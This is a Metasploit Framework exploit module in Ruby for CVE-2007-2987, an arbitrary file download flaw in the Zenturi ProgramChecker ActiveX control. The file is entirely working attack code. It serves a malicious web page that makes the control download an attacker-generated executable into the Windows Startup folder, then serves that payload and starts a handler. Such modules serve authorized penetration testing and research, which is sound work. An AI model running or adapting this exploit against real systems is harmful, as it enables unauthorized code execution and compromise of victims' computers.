##
# $Id: zenturiprogramchecker_unsafe.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require \'msf/core\'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			\'Name\'           => \'Zenturi ProgramChecker ActiveX Control Arbitrary File Download\',
			\'Description\'    => %q{
					This module allows remote attackers to place arbitrary files on a users file system
				via the Zenturi ProgramChecker sasatl.dll (1.5.0.531) ActiveX Control.
			},
			\'License\'        => MSF_LICENSE,
			\'Author\'         => [ \'MC\' ],
			\'Version\'        => \'$Revision: 11127 $\',
			\'References\'     =>
				[
					[ \'CVE\', \'2007-2987\' ],
					[ \'OSVDB\', \'36715\' ],
					[ \'BID\', \'24217\' ],
				],
			\'Payload\'        =>
				{
					\'Space\'           => 2048,
					\'StackAdjustment\' => -3500,
				},
			\'Platform\'       => \'win\',
			\'Targets\'        =>
				[
					[ \'Automatic\', { } ],
				],
			\'DisclosureDate\' => \'May 29 2007\',
			\'DefaultTarget\'  => 0))

		register_options(
			[
				OptString.new(\'PATH\', [ true, \'The path to place the executable.\', \'C:\\\\\\\\Documents and Settings\\\\\\\\All Users\\\\\\\\Start Menu\\\\\\\\Programs\\\\\\\\Startup\\\\\\\\\']),
			], self.class)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)

		payload_url =  \"http://\"
		payload_url += (datastore[\'SRVHOST\'] == \'0.0.0.0\') ? Rex::Socket.source_address(cli.peerhost) : datastore[\'SRVHOST\']
		payload_url += \":\" + datastore[\'SRVPORT\'] + get_resource() + \"/payload\"

		if (request.uri.match(/payload/))
			return if ((p = regenerate_payload(cli)) == nil)
			data = generate_payload_exe({ :code => p.encoded })
			print_status(\"Sending EXE payload to #{cli.peerhost}:#{cli.peerport}...\")
			send_response(cli, data, { \'Content-Type\' => \'application/octet-stream\' })
			return
		end

		vname  = rand_text_alpha(rand(100) + 1)
		exe    = rand_text_alpha(rand(20) + 1)

		content = %Q|
		<html>
			<object id=\'#{vname}\' classid=\'clsid:59DBDDA6-9A80-42A4-B824-9BC50CC172F5\'></object>
			<script language=\"JavaScript\">
				#{vname}.DownloadFile(\"#{payload_url}\", \"#{datastore[\'PATH\']}\\\\#{exe}.exe\", 1, 1);
			</script>
		</html>
				|

		print_status(\"Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...\")

		send_response_html(cli, content)

		handler(cli)

	end

end
